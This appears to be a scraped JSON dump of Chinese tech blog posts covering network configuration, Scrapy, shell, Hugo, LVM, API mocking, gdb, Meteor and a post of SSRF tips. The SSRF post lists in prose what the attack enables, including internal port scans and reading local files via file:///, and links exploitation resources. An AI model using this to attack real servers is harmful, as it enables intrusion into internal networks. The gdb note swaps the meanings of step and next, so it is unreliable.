10.18.44.63\n      dns-nameservers 10.0.80.11 10.0.80.12\n      # set static route for LAN\n      post-up route add -net 10.0.0.0 netmask 255.0.0.0 gw 10.18.44.1\n      post-up route add -net 161.26.0.0 netmask 255.255.0.0 gw 10.18.44.1\n      bridgeports eth0\n      bridgestp off\n      bridgefd 0\n      bridgemaxwait 0\n\nbr1 使用静态公网 IP 地址，并以 ISP 的路由器作为网关\nauto br1\niface br1 inet static\n        address 208.43.222.51\n        network 255.255.255.248\n        netmask 255.255.255.0\n        broadcast 208.43.222.55\n        gateway 208.43.222.49\n        bridgeports eth1\n        bridgestp off\n        bridgefd 0\n        bridgemaxwait 0\n重启网络服务\nsudo systemctl restart networking\nsudo /etc/init.d/restart networking\n 4. eth\ncentos eth1\nvi /etc/sysconfig/network-scripts/ifcfg-eth1\nDEVICE=eth1\nONBOOT=yes\nBOOTPROTO=static\nIPADDR=139.129.108.163\nNETMASK=255.255.252.0\n\n    TYPE=\"Ethernet\"\n    BOOTPROTO=\"none\"\n    DEFROUTE=\"yes\"\n    IPV4FAILUREFATAL=\"no\"\n    IPV6INIT=\"yes\"\n    IPV6AUTOCONF=\"yes\"\n    IPV6DEFROUTE=\"yes\"\n    IPV6FAILUREFATAL=\"no\"\n    NAME=\"enp0s3\"\n    UUID=\"e9f9caef-cb9e-4a19-aace-767c6ee6f849\"\n    ONBOOT=\"yes\"\n    HWADDR=\"08:00:27:80:63:19\"\n    IPADDR0=\"192.168.1.150\"\n    PREFIX0=\"24\"\n    GATEWAY0=\"192.168.1.1\"\n    DNS1=\"192.168.1.1\"\n    IPV6PEERDNS=\"yes\"\n    IPV6_PEERROUTES=\"yes\"\n`","tags":null},{"location":"//blog.pytool.com/Post/scrapy/2014-04-24-scrapy-tutorial","title":"scrapy 导读","text":"原文地址：http://doc.scrapy.org/en/latest/intro/tutorial.html\nScrapy 一瞥\n\n 定义你想要抓取的数据模型 (scrapy.Item)\n 写蜘蛛(CrawlSpider)，\n 运行蜘蛛 scrapy crawl spidername\n\nScrapy 功能\n\n 内置从HTML和XML中选择并提取数据的能力\n 内置数据净化能力，通过一系列可重用的过滤器（item loaders）\n 内置支持数据导出成多种格式(JSON,CSV,XML),且支持多种存储（FTP,S3,本地文件）\n 一个媒体管道用来自动下载图片或其他媒体资源\n 支持扩展“Support for extending Scrapy by plugging your own functionality using signals and a well-defined API (middlewares, extensions, and pipelines).”\n 内置大量中间件和扩展，用来：\n    cookie和session 处理\n    HTTP压缩\n    HTTP验证\n    HTTP缓存\n    user-agent spoofing\n    robots.txt\n    限制爬行深度\n    等等\n 强壮的编码支持，用于解决国外不标准和broken的编码声明\n 支持基于预定义模板快速创建蜘蛛（genspider 命令）\n 可扩展的状态收集，用来监控蜘蛛运行状况\n Interactive shell console用来尝试xpath，和调试蜘蛛\n “A System service designed to ease the deployment and run of your spiders in production.\n A built-in Web service for monitoring and controlling your bot\n A Telnet console for hooking into a Python console running inside your Scrapy process, to introspect and debug your crawler\n Logging facility that you can hook on to for catching errors during the scraping process.\n Support for crawling based on URLs discovered through Sitemaps [http://www.sitemaps.org]\n A caching DNS resolver”\n\nscrapy导读\n\n 创建一个Scrapy项目\n 定义要提取的Item\n 写蜘蛛\n 写Item Pipline 保存数据\n\n创建Scrapy项目\n\n    scrapy startproject tutorial\n\n定义要提取的Item\n通过scrapy.Item类定义Item\n通过scrapy.Field定义属性\n\n我们的第一个蜘蛛\n\n蜘蛛定义了开始链接、接下去的链接以及数据提取规则\n\n通过继承scrapy.Spider并且定义三个强制属性：\n\n name用来标识蜘蛛，必须唯一。\n start_urls蜘蛛开始爬取的的链接列表。\n parse()用来解析返回值并提取数据和更多的跟踪链接。在每个开始链接返回内容之后被调用，参数是网页返回值。\n\n原理：Scrapy给每个开始连接创建scrapy.Request对象，并且将parse方法赋给它们作为回调函数。\n这些请求被调度，然后执行，并返回scrapy.http.Response对象，然后将该对象返回给parse()方法。\n\n提取数据\n介绍选择器\n有好多方式可以从网页上提取数据。Scrapy用的是基于Xpath和CSS选择器的机制，叫做Scrapy Selector。\nScrapy提供了Selector类和方便的快捷调用，这样就不用你每次实例化了。\n\n你可以把Selector看成是代表文档中节点的对象。所以，第一个被初始化的selector代表根节点即整个文档。\n\nSelector有四个基本的方法\n\n Xpath():返回selector的列表，每个代表根据xpath表达式选择到的节点\n css():返回selector的列表\n extract():返回一个Unicode字符串\n re():返回一个Unicode字符串列表，根据参数正则表达式\n\n在shell里测试选择器\n使用Scrapy shell的前提是你安装了 IPython\n\n要想启动shell，转到项目根目录，执行：\n\n    scrapy shell 'http://www.dmoz.org/Computer/'\n\n注意：要将url用引号引起来。\n\nshell 加载完成之后，你将得到返回值，它被赋给一个本地response对象，如果你输入respones.body你会看到返回值的body，如果你输入response.headers你会看到返回头。\n\n更重要的是，如果你输入response.selector你会得到一个selector对象。你可以用它来查询response。快捷引用response.xpath() 和 response.css() 分别对应 response.selector.xpath() 和 response.selector.css()”。\n\n提取数据\n例如：\n\n    sel.xpath('//ul/li/text()').extract()\n\n每个.xpath()调用都会返回一个selector的列表，我们可以对其中的每个节点再深入的调用.xpath()，如下：\n\n    for sel in response.xpath('//ul/li')\n        title=sel.xpath('a/text()').extract()\n\n使用Item\nItem 对象是自定义的Python dict。scrapy期望把抓到的数据以Item对象的形式返回。","tags":null},{"location":"//blog.pytool.com/Post/shell/Shell常用招式大全命令篇","title":"Shell常用招式大全-命令篇","text":"继上篇《入门篇》之后，本篇《命令篇》为《Shell常用招式大全》的第二篇教程。\r\n\r\n本篇根据本人的工作经验，总结了Linux下一些常用命令的使用技巧。旨在精而不在全，对于百度一下或man一下即可知道的使用方法不做详细介绍。\r\n\r\n适合在Linux下用过一些命令，小尝甜头，但仍觉得Shell不是那么称手的读者。\r\n\r\n[TOC]\r\n\r\n第一招 文本处理\r\n\r\n无名氏说：编程有两件事，一件是处理数值，另一件是处理字符串。\r\n\r\n 第一式 cut 切割分列\r\n\r\n    casheywen@ubuntu:~$ cat test.txt\r\n    1 2 3 4 5 6\r\n    a b c d e f g h i\r\n    apple banana pear peach\r\n    casheywen@ubuntu:~$ cat test.txt | cut -f 2 -d ' '   # 取出第2列\r\n    2\r\n    b\r\n    banana\r\n    casheywen@ubuntu:~$ cat test.txt | cut -f 2,3 -d ' '  # 取出第2,3两列\r\n    2 3\r\n    b c\r\n    banana pear\r\n    casheywen@ubuntu:~$ cat test.txt | cut -f 3- -d ' '   # 取出第3到最后一列\r\n    3 4 5 6\r\n    c d e f g h i\r\n    pear peach\r\n    casheywen@ubuntu:~$ cat test.txt | cut -f 3-5 -d ' '  # 取出第3~5列\r\n    3 4 5\r\n    c d e\r\n    pear peach\r\n    casheywen@ubuntu:~$ cat test.txt | cut -f 3 --complement -d ' '  # 取出除第3列外的所有列\r\n    1 2 4 5 6\r\n    a b d e f g h i\r\n    apple banana peach\r\n\r\n从以上示例大家可以明白，cut是一个列处理命令，功能上可以代替大多数类似awk '{print $1}'的效果，写起来很方便。\r\n\r\n  cut命令的参数:\r\n    1. -f 指定选择的列\r\n  2. -d 指定分割符\r\n  3. --complement 反选，指定后会打印不在-f中的所有列\r\n\r\n技一: 读取配置文件\r\n\r\n例如有一个格式如下的配置文件 test.conf：\r\n\r\n\tIP = 192.168.0.1\r\n\tPORT = 12800\r\n\r\n我们可以用如下命令来读取IP字段：\r\n\r\ncasheywen@ubuntu:~$ cat test.conf | grep -w IP | cut -f 2 -d = | xargs\r\n192.168.0.1\r\n  ","tags":null},{"location":"//blog.pytool.com/hugo/hugo_sort","title":"Hugo 文档处理","text":"文档排序\n\n当在列表页面展示多篇文档时，就涉及到文档先后顺序的问题了。Hugo 中文档默认是以元信息 weight 来排序，当文档未指定 weight 时，就以元信息 date 来排序，如果这两项都没有指定的话，列表页面看到的文档就是无序的。\n\n不过除了上面 weight 和 date 外，Hugo 还支持我们以更多方式来排序列表页面，我们需要在列表模板文件中使用以下一些模板变量来控制文档的排序\n\n按照元信息权重和日期排序（默认排序方式）\n\n    {{ range .Data.Pages }}\n  li\n  a href=\"{{ .Permalink }}\"{{ .Title }}/a\n  div class=\"meta\"{{ .Date.Format \"Mon, Jan 2, 2006\" }}/div\n  /li\n  {{ end }}\n  \n按照元信息日期排序\n\n    {{ range .Data.Pages.ByDate }}\n    !-- ... --\n  {{ end }}\n  \n按照发布日期排序\n\n    {{ range .Data.Pages.ByPublishDate }}\n    !-- ... --\n  {{ end }}\n  \n按照失效日期排序\n\n    {{ range .Data.Pages.ByExpiryDate }}\n    !-- ... --\n  {{ end }}\n  \n按照修改日期排序\n\n    {{ range .Data.Pages.ByLastmod }}\n    !-- ... --\n  {{ end }}\n  \n按照文档内容长度排序\n\n    {{ range .Data.Pages.ByLength }}\n    !-- ... --\n  {{ end }}\n  \n按照文档标题排序\n\n    {{ range .Data.Pages.ByTitle }}\n    !-- ... --\n  {{ end }}\n  \n按照链接标题排序\n\n    {{ range .Data.Pages.ByLinkTitle }}\n    !-- ... --\n  {{ end }}\n  \n按照其它元信息排序\n\n    {{ range (.Date.Pages.ByParam \"author.lastname\") }}\n    !-- ... --\n  {{ end }}\n  \n反转排序（以上所有排序都可反转）\n\n    {{ range .Data.Pages.ByTitle.Reverse }}\n    !-- ... --\n  {{ end }}\n  \n除此之外，文档还可以按照分类进行排序，而分类标签本身可以按照标签字母序来排序\n\nul\n{{ $data := .Data }}\n{{ range $key, $value := .Data.Taxonomy.Alphabetical }}\nlia href=\"{{ .Site.LanguagePrefix }}/{{ $data.Plural }}/{{ $value.Name | urlize }}\" {{ $value.Name }} /a {{ $value.Count }} /li\n{{ end }}\n/ul\n\n或者按照关联到该分类标签的文档数量排序（即按照分类的热门程度排序）\n\nul\n{{ $data := .Data }}\n{{ range $key, $value := .Data.Taxonomy.ByCount }}\nlia href=\"{{ .Site.LanguagePrefix }}/{{ $data.Plural }}/{{ $value.Name | urlize }}\" {{ $value.Name }} /a {{ $value.Count }} /li\n{{ end }}\n/ul\n\n属于某个分类的文档默认按照 weight 和 date 来排序，并且支持为文档指定分类排序时的权重，这样可以调整文档在分类中的顺序，这个功能通过文档中指定元数据 taxonomynameweight 来实现，其中 taxonomyname 代表分类名。\n\n 文档分组\n\n当在列表页面展示多篇文档时，Hugo 支持我们根据文档类型、日期或者 Section 来分组显示文档。\n\n按照 Section 分组\n\n    {{ range .Data.Pages.GroupBy \"Section\" }}\n  h3{{ .Key }}/h3\n  ul\n      {{ range .Pages }}\n      li\n      a href=\"{{ .Permalink }}\"{{ .Title }}/a\n      div class=\"meta\"{{ .Date.Format \"Mon, Jan 2, 2006\" }}/div\n      /li\n      {{ end }}\n  /ul\n  {{ end }}\n  \n按照日期分组\n\n    {{ range .Data.Pages.GroupByDate \"2006-01\" }}\n    !-- ... --\n  {{ end }}\n  \n按照发布日期分组\n\n    {{ range .Data.Pages.GroupByPublishDate \"2006-01\" }}\n    !-- ... --\n  {{ end }}\n  \n按照其它元信息分组\n\n    {{ range .Data.Pages.GroupByParam \"param_key\" }}\n    !-- ... --\n  {{ end }}\n  \n反转分组排序\n\n    {{ range (.Data.Pages.GroupByDate \"2006-01\").Reverse }}\n    !-- 利用模板函数Reverse来反转 --\n  {{ end }}\n\n  {{ range .Data.Pages.GroupByDate \"2006-01\" \"desc\" }}\n    !-- 或者直接指定排序方向 --\n  {{ end }}\n  \n组内文档排序\n\n    {{ range .Data.Pages.GroupByDate \"2006-01\" \"asc\" }}\n  h3{{ .Key }}/h3\n  ul\n      {{ range .Pages.ByTitle }}\n      !-- 可以按照之前介绍排序文档的各种方法来排序组内文档 --\n      {{ end }}\n  /ul\n  {{ end }}\n  \n文档过滤\n\n有时候也许想要排除某些文档在列表页面显示，Hugo 支持我们在列表页面限制文档显示数量以及限制显示的文档种类。\n\n限制文档显示数量\n\n    {{ range first 10 .Data.Pages }}\n      !-- 利用模板函数first，只显示排在前面的10篇文档 --\n      {{ .Render \"summary\" }}\n  {{ end }}\n  \n根据条件过滤某些文档\n\n    {{ range where .Data.Pages \"Section\" \"post\" }}\n     !-- 利用模板函数where，只筛选显示Section为post的文档 --\n     {{ .Content }}\n  {{ end }}\n\n  {{ range first 5 (where .Data.Pages \"Section\" \"post\") }}\n     !-- 同时使用where和first --\n     {{ .Content }}\n  {{ end }}\n  \n 文档摘要\n\nHugo 默认会截取文档前70个词作为文档摘要，并将摘要内容存放在模板页面变量 .Summary ，同时提供模板变量 .Truncated 来记录截取的摘要是否包含了文档的全部内容。同时 Hugo 还支持我们在内容文档中明确指定将哪些内容作为该文档的摘要，具体来说需要在文档中插入一行 !--more-- 来标识位于该行之前的内容作为摘要，同理 Hugo 会将摘要存放在模板页面变量 .Summary ，并用模板变量 .Truncated 标识摘要是否包含了文档全部内容。\n\n利用文档的摘要功能可以实现“阅读更多...”这样的功能，示例如下\n\n{{ range first 10 .Data.Pages }}\n  div class=\"summary\"\n    h4a href=\"{{ .RelPermalink }}\"{{ .Title }}/a/h4\n    {{ .Summary }}\n  /div\n  {{ if .Truncated }}\n  div class=\"read-more-link\"\n    a href=\"{{ .RelPermalink }}\"Read More…/a\n  /div\n  {{ end }}\n{{ end }}\n`","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 lvm2","title":"Linux命令 lvm2","text":"Linux中LVM2原理及制作LVM2 - 兰枫 - CSDN博客\nLVM逻辑卷管理器配置小结\nLinux存储入门：简易数据恢复方案--分区和LVM实战-博客-云栖社区-阿里云\nLVM简明教程\n\nlsblk  能够显示每个设备的更多信息，如标签和型号，更多请查看信息手册。\nblkid  显示块设备（分区和存储介质）属性，例如UUID和文件系统类型，不报告分区空间\n\n一、LVM原理\n【MD】:Multi Device 多设备  [RAID]\n      Mdadm是一个用户空间工具，是RAID的管理工具，与真正的RAID工作没有太大关系。真正的RAID集成在linux内核中\n【DM】Device Mapper设备映射也是linux中一种常用的管理机制 [LVM2]\n     DM 与MD近似，也能够提供一种逻辑设备\n     DM比MD的功能要强大。因为DM不仅仅能提供MD的RAID的功能，它还是逻辑卷（LVM2）基础，同时，在逻辑卷的基础上我们也能实现RAID0,RAID1。这样的功能。所有DM与MD中有某些功能是重叠的，但并不完全重叠。所以，我们通常使用MD做RAID用DM做LVM2\nRAID：只是为了避免硬件损坏而导致业务终止或数据损失的。并不能保证人为错误的操作，导致数据损失。说以通常即使有RAID后数据依然要做备份。\nDM除了快照外，还支持动态缩减磁盘大小。\n\nset -e\nset -x\n\nsudo fdisk /dev/vdb \u003c","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone支持docker","title":"drone支持docker","text":"Docker | Plugins | Drone\ndrone-plugins/drone-docker: Drone plugin for publishing Docker images","tags":null},{"location":"//blog.pytool.com/Post/基础/2017-04-18 前后端分离模式研究","title":"前后端分离开发模式的 mock 平台预研","text":"引入\n\nmock（模拟）: 是在项目测试中，对项目外部或不容易获取的对象/接口，\\用一个虚拟的对象/接口来模拟，以便测试。\n\n 背景\n\n前后端分离\n\n前后端仅仅通过异步接口(AJAX/JSONP)来编程\n前后端都各自有自己的开发流程，构建工具，测试集合\n关注点分离，前后端变得相对独立并松耦合\n\n 开发流程\n\n后台编写和维护接口文档，在 API 变化时更新接口文档\n后台根据接口文档进行接口开发\n前端根据接口文档进行开发\n开发完成后联调和提交测试\n\n面临问题\n\n没有统一的文档编写规范，导致文档越来越乱，无法维护和阅读\n开发中的接口增删改等变动，需要较大的沟通成本\n对于一个新需求，前端开发的接口调用和自测依赖后台开发完毕\n将接口的风险后置，耽误项目时间\n\n 解决方法\n\n接口文档服务器 -- 解决接口文档编辑和维护的问题\nmock 数据 -- 解决前端开发依赖真实后台接口的问题\n\n接口文档服务器\n\n 功能\n\n接口编辑功能\n\n类型1：根据接口描述语法书写接口，并保存为文本文件，然后使用生成工具生成在线接文档（HTML）\n  -- 也有一些类似 Markdown 的接口文档编辑器，参见：There Are Four API Design Editors To Choose From Now。\n  \n类型2：提供在线的接口编辑平台，进行可交互的接口编辑\n  \n\n 接口查看功能\n\n提供友好的接口文档查看功能\n\n用法\n\n后台开发人员进行接口文档编写\n  -- 定义接口路径、接口上传字段、接口返回字段、字段含义、字段类型、字段取值\n前端开发人员查看接口文档\n\n 优点\n\n统一管理和维护接口文档\n  -- 提供了接口导入、接口模块化、接口版本化、可视化编辑等功能\n接口文档规范，可读性强，减少前后端接口沟通成本\n\n前端 mock 方法回顾\n\n前端开发过程中，使用 mock 数据来模拟接口的返回，对开发的代码进行业务逻辑测试。解决开发过程中对后台接口的依赖。\n\n 硬编码数据\n\n将 mock 数据写在代码中。\n\n示例\n\n// $.ajax({\n//   url: ‘https://cntchen.github.io/userInfo’,\n//   type: 'GET',\n//   success: function(dt) {\n    var dt = {\n      \"isSuccess\": true,\n      \"errMsg\": \"This is error.\",\n      \"data\": {\n        \"userName\": \"Cntchen\",\n        \"about\": \"FE\"\n      },\n    };\n    if (dt.isSuccess) {\n      render(dt.data);\n    } else {\n      console.log(dt.errMsg);\n    }\n//   },\n//   fail: function() {}\n// });\n\n 优点\n\n可以快速修改测试数据\n\n痛点\n\n无法模拟异步的网络请求，无法测试网络异常\n肮代码，联调前需要做较多改动，增加最终上真实环境的切换成本\n  -- 添加网络请求，修改接口、添加错误控制逻辑\n接口文档变化需要手动更新\n\n 请求拦截 \u0026 mock 数据\n\nhijack（劫持）接口的网络请求，将请求的返回替换为代码中的 mock 数据。\n\n实例\n\njquery-mockjax\n\n  The jQuery Mockjax Plugin provides a simple and extremely flexible interface for mocking or simulating ajax requests and responses\n\n 优点\n\n可以模拟异步的网络请求\n可以快速修改测试数据\n\n痛点\n\n依赖特定的框架，如Jquery\n增加最终上真实环境的切换成本\n接口文档变换需要手动更新\n\n 本地 mock 服务器\n\n将 mock 数据保存为本地文件。在前端调试的构建流中，用 node 开本地 mock 服务器，请求接口指向本地 mock 服务器，本地 mock 服务器 response mock 文件。\n\nmock 文件\n\n.mock\n├── userInfo.json\n├── userStars.json\n├── blogs.json\n└── following.json\n\n 接口调用\n\nhttps://github.com/CntChen/userInfo --  localhost:port/userInfo\n\n优点\n\n对代码改动较小，联调测试只需要改动接口 url\n可以快速修改测试数据\n\n 痛点\n\njson 文件非常多\n接口文档变化需要手动更新\n\n代理服务器\n\n使用 charles 或 fiddler 作为代理服务器\n使用代理服务器的 map（映射）\u0026 rewrite（重写） 功能\n\n map local\n\n接口请求的返回映射为本地 mock 数据\n  https://github.com/CntChen/userInfo --  localPath/userInfo\n\n编辑映射规则\n  \n\nmap remote\n\n接口请求的返回映射为另一个远程接口的调用\n  \n\n rewrite\n\n修改接口调用的 request 或 response，添加/删除/修改 HTTP request line/response line/headers/body\n  \n解决跨域问题\n  使用 map 后，接口调用的 response 不带 CORS headers，跨域请求在浏览器端会报错。需要重写接口返回的 header，添加 CORS 的字段。\n  \n\n优点\n\n前端直接请求真实接口，无需修改代码\n可以修改接口返回数据\n\n 痛点\n\n需要处理跨域问题\n一个变更需要代理服务器进行多处改动，配置效率低下\n不支持 HTTP method 的区分\n  -- CORS 的 preflight 请求(OPTION)也会返回数据\n需要有远程接口或本地 mock 文件，与使用本地 mock 文件相同的痛点\n\nmock 平台\n\n 接口文档服务器\n\n使用接口文档服务器来定义接口数据结构\n\nmock服务器\n\nmock 服务器根据接口文档自动生成 mock 数据，实现了接口文档即API\n\n 优点\n\n接口文档自动生成和更新 mock 数据\n前端代码联调时改动小\n\n缺点\n\n可能存在跨域问题\n\n 业界实践\n\n公司实践\n\n没有找到公司级别的框架，除了阿里的 RAP。可能原因：\n\n非关键性、开创性技术，没有太多研究价值\n许多大公司是小团队作战，没有统一的 mock 平台\n已经有一些稳定的接口，并不存在后台接口没有开发完成的问题\n  -- 而我们想探究的问题是：前后端同时开发时的 mock\n\n github 开源库\n\nfaker.js\n  随机生成固定字段的 mock 数据,如email，date，images等，支持国际化。\nblueprint\n\n  A powerful high-level API design language for web APIs.\n\n一种使用类markdown语法的接口编写语言，使用json-schema和mson作为接口字段描述。有完善的工具链进行接口文件 Edit，Test，Mock，Parse，Converter等。\n\nswagger\n\n  Swagger是一种 Rest API 的简单但强大的表示方式，标准的，语言无关，这种表示方式不但人可读，而且机器可读。可以作为 Rest API 的交互式文档，也可以作为 Rest API 的形式化的接口描述，生成客户端和服务端的代码。 --Swagger：Rest API的描述语言\n\n定义了一套接口文档编写语法，然后可以自动生成接口文档。相关项目: Swagger Editor ，用于编写 API 文档。Swagger UI restful 接口文档在线自动生成与功能测试软件。点击查看Swagger-UI在线示例。\n\nwireMock\n\n  WireMock is a simulator for HTTP-based APIs. Some might consider it a service virtualization tool or a mock server. It supports testing of edge cases and failure modes that the real API won't reliably produce.\n\n商业化方案\n\napiary\n  商业化方案，blueprint开源项目的创造者。界面化，提供mock功能，生成各编程语言的调用代码(跟 postman 的 generate code snippets类似)。\n\n 其他实践\n\nAPI Evangelist(API 布道者)\n\n总结\n\n对于前后端分离开发方式，已经有比较成熟的 mock 平台，主要解决了2个问题：\n\n接口文档的编辑和维护\n接口 mock 数据的自动生成和更新\n\n 后记\n\n预研时间比较有限，有一些新的 mock 模式或优秀的 mock 平台没有覆盖到，欢迎补充。\n笔者所在公司选用的平台是 RAP，后续会整理一篇 RAP 实践方面的文章。\n问题来了：你开发中的 mock 方式是什么？\n\nReferences\n\n图解基于node.js实现前后端分离\n\n  http://yalishizhude.github.io/2016/04/19/front-back-separation/\n    [图解基于node.js实现前后端分离]: http://yalishizhude.github.io/2016/04/19/front-back-separation/(http://yalishizhude.github.io/2016/04/19/front-back-separation/)\n\nTestDouble(介绍 mock 相关的概念)\n\n  http://martinfowler.com/bliki/TestDouble.html\n    [mock 相关的概念]: http://martinfowler.com/bliki/TestDouble.html(http://martinfowler.com/bliki/TestDouble.html)\n\nThere Are Four API Design Editors To Choose From Now\n\n  https://apievangelist.com/2014/11/21/there-are-four-api-design-editors-to-choose-from-now/\n    [There Are Four API Design Editors To Choose From Now]: https://apievangelist.com/2014/11/21/there-are-four-api-design-editors-to-choose-from-now/(https://apievangelist.com/2014/11/21/there-are-four-api-design-editors-to-choose-from-now/)\n\n联调之痛--契约测试\n\n  http://www.ituring.com.cn/article/42460\n    [联调之痛]: http://www.ituring.com.cn/article/42460(http://www.ituring.com.cn/article/42460)\n\nSwagger：Rest API的描述语言\n\n  https://zhuanlan.zhihu.com/p/21353795\n    [Swagger：Rest API的描述语言]: https://zhuanlan.zhihu.com/p/21353795(https://zhuanlan.zhihu.com/p/21353795)\n\nSwagger - 前后端分离后的契约\n\n  http://www.cnblogs.com/whitewolf/p/4686154.html\n    [Swagger - 前后端分离后的契约]: http://www.cnblogs.com/whitewolf/p/4686154.html(http://www.cnblogs.com/whitewolf/p/4686154.html)\n\nSwagger UI教程 API 文档神器 搭配Node使用\n\n  http://www.jianshu.com/p/d6626e6bd72c\n    [Swagger UI教程 API 文档神器 搭配Node使用]: http://www.jianshu.com/p/d6626e6bd72c#(http://www.jianshu.com/p/d6626e6bd72c#)\n\nEND","tags":null},{"location":"//blog.pytool.com/cmd/2016-06-01 Linux命令 gdb","title":"gdb使用笔记","text":"gdb的基本使用\n\n用gdb调试程序要确保调试的程序带有调试信息，这要求在链接程序的时候加上\"-G\"的参数。用gdb executable启动调试，其中executable表示执行文件的名称。启动调试后，进入交互式对话，命令提示符变成(gdb)$，等待你输入调试命令。/p\n\n\t你输入run或r，回车，程序将开始运行，如果有断点会在断点处停住。\n\t输入break或b,后面跟行号，将会在当前文件指定行设置断点；b后面也可以跟函数名（如果是类的成员函数，需要类名::成员函数名），会在进入该函数后停住。\n\tinfo break，将会列出所有断点的信息。d breaknumber，将删除指定编号的断点，如果d后面什么都不加，将删除所有断点。disable breaknumber，并不会删除断点，只会禁用断点，可以用enable breaknumber重新启用。如果disable(enable)后面什么都不跟，将禁用(启用)所有断点。\n\tcontinue或c，将继续运行程序，直到下一个断点停住。\n\tstep或s，单步执行，但不会进入函数。\n\tnext或n，下一条指令，如果遇到函数会进入。\n\tsi和ni，对应于step和next，只不过用于汇编指令。\n\tp 变量名。查看指定的变量值。\n\t还有，基本的一点，如果不输入命令直接回车，则重复执行上一条指令。\n\tq，退出调试过程。\n\tuntil或u，跳出循环。\n\t在gdb下可以直接make或编译，然后输入r，重新运行程序。\n\ngdb真的很好用，至少纯键盘操作调试速度就比gui下快。我上面讲的只是gdb的一点皮毛，精通了gdb真的很强大。关于gdb的教程，可以看陈皓的《用gdb调试程序》，写得真不错。我很喜欢看他的教程，还有《跟我一起写makefile》以及《编程修养》，深入浅出，比外面卖的一些拼凑的教程强上百倍。/p","tags":null},{"location":"//blog.pytool.com/Hacker/2015-03-29 SSRF","title":"SSRF的一些TIPS","text":"最近ssrf漏洞很火啊，这里贴一些tips\n\n这些天专注了解了SSRF攻击（Server-side Request Forgery，服务器端请求伪造），对这类攻击有了自己的一些总结与看法，老外取这个名字是挺不错的，我很喜欢，这让我想到了CSRF（Cross-site Request Forgery，跨站请求伪造），前者是在服务器端发出了伪造的请求，后者是在浏览器端发出伪造请求。\n\n利用这个漏洞，可以从漏洞服务器发出伪造的请求到目标服务上，目标服务可以是内网的各类服务，可以使用不一样的协议，并根据回显来判断攻击是否成功（如果是盲打的话，就不用回显了:)）。\n\n可以进行的攻击类型有：\n可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；\n攻击运行在内网或本地的有漏洞程序（比如溢出）；\n可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹\n攻击内网或外网有漏洞的Web应用，这《JavaScript安全从浏览器到服务端》可以看到类似思路，不过用的都是JavaScript:)；\n使用file:///协议读取本地文件，类比下本地文件读取漏洞？；\n\nSSRF漏洞的思维导图：\n\nSSRF脑图 (1).jpg\n\n导图下载\n\n如需要漏洞案例的话，请自行搜索一些漏洞平台相关的漏洞\n\n大家可以根据上面这几点进行发散，SSRF很好理解。\n\n可以参考下面的一些文章：\n\n猪猪侠乌云峰会的PDF《 buildyourssrfexpautowork 》 :\nhttp://pan.baidu.com/s/1qY5sPVe\n\nSSRF Tips(写得很全很详细):\nhttp://www.mottoin.com/84635.html\n\nSSRF攻击测试:\nhttp://www.mottoin.com/84709.html\n\nSSRF攻击实例解析 :\nhttp://www.freebuf.com/articles/web/20407.html\n\nSSRF漏洞的挖掘经验 :\nhttp://bobao.360.cn/learning/detail/240.html\n\nSSRF漏洞检测、利用及防范:\nhttp://www.cnki.com.cn/Article/CJFDTotal-SCTJ201503067.htm\n\nriyazwalikar的三篇实战文章不错:\n1.http://www.riyazwalikar.com/2012/11/cross-site-port-attacks-xspa-part-1.html\n2.http://www.riyazwalikar.com/2012/11/cross-site-port-attacks-xspa-part-2.html\n3.http://www.riyazwalikar.com/2012/11/cross-site-port-attacks-xspa-part-3.html\n\nP神的wiki(很多资料一搜就有了):\nhttp://wiki.ioin.in/search?word=ssrf\n\nSSRF漏洞利用框架 :\nhttps://github.com/jayeshchauhan/SKANDA\n\nhttps://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#heading=h.u7du7rbwr3fw  这个资料很棒","tags":null},{"location":"//blog.pytool.com/Post/前端技术/meteor/2016-03-29  Meteor的reactive特性","title":"Meteor","text":"Principles of Meteor\n\nMeteor 是一个实时 full stack JavaScript 框架。Reactivity 是它的一个非常重要的特点。官网上列出了 Meteor 的7大原则或者说是特点:\n\n    Data on the Wire. Meteor 不发 HTML，服务器端只负责发送数据，让客户端来渲染\n\n    One Language. 前后端都是 JavaScript 语言\n\n    Database Everywhere. 前后端都可以直接创建存取修改数据库里的数据，并且安全\n\n    Latency Compensation. Meteor 在前端提前获取数据并模拟数据模型，使其看起来像是从服务器端立即返回了数据\n\n    Full Stack Reactivity. 实时相应是 Meteor 的缺省配置。在所有层面，从数据库到模板，都会在必要时自动更新\n\n    Embrace the Ecosystem. Meteor 完全开源并集成了很多现有的开源工具和框架。例如 Angular，React。Meteor 有自己的 AtmosphereJS 包下载管理应用，也可直接使用 NPM (目前是非官方支持)\n\n    Simplicity Equals Productivity. Meteor 简单易上手，API 简介优美\n\n什么是 Reactivity\n\n可能还有人不理解什么是 Reactivity。简单来说 Reactivity 就是数据传递的一种模式，特别是如何传递数据的变化。一种编程语言或者框架如果能够自动传递数据的变化，不需要用户再编写代码去更新使用到的变量，那么我们就说它是 reactive 的。\n\n比如 Meteor 和 facebook 的 React 框架就是这么处理数据变化的，不需要额外的代码。如果 reactive 的变量发生了变化，那么框架会自动再次运行使用到这个变量且具有 reactive 特性的代码段 - 这里引入了一个 reactive computation/context (程序的上下文，一般是一个函数) 概念。如果配合使用 React，React 会自动在 virtual dom 上比较，然后只渲染更新了的那一小部分，而不是再把所有涉及到的无论变化与否的 view 都再渲染一次。这样不用自己再写代码来指定更新的地方，代码就更容易维护，前端的开发和运行效率都有提高。\n\n举个例子。a = b + c，如果 b 是 1，c 是 2，那么 a 的值就是 3。在不是 reactive 的\u0008函数里，如果 b 的值变为 4，什么事情都不会发生，你得自己动手去触发需要更新的地方；而在 reactive 的函数里，a 的值会自动变为 6。凡是在\u0008 Template 里引用 a 的地方都会变为 6，而不再需要手动更新。就是 b 和 c 改变了，这个 reactive 函数会被自动调用，再次计算得出 a 的新值 6。这样代码会少很多，逻辑也更简单，特别是涉及到需要再次渲染 view 的时候。\n\n最后注意，要具备 reactivity，必须得满足两个条件。第一是要有一个 reactive 的数据源，第二就是这个数据源要在具有 reactive 特性的上下文里被使用。这样可以避免一些不必要的副作用，可以选择不用 reactivity，如果不需要的话。\nReactivity of Meteor\n\nMeteor server 端没有 reactivity，只有 client 端才有。\nMeteor 数据库和模板都能自动更新，可以使用 facebook 的 React 使前端组件化，代码会更好维护。可以把 Meteor 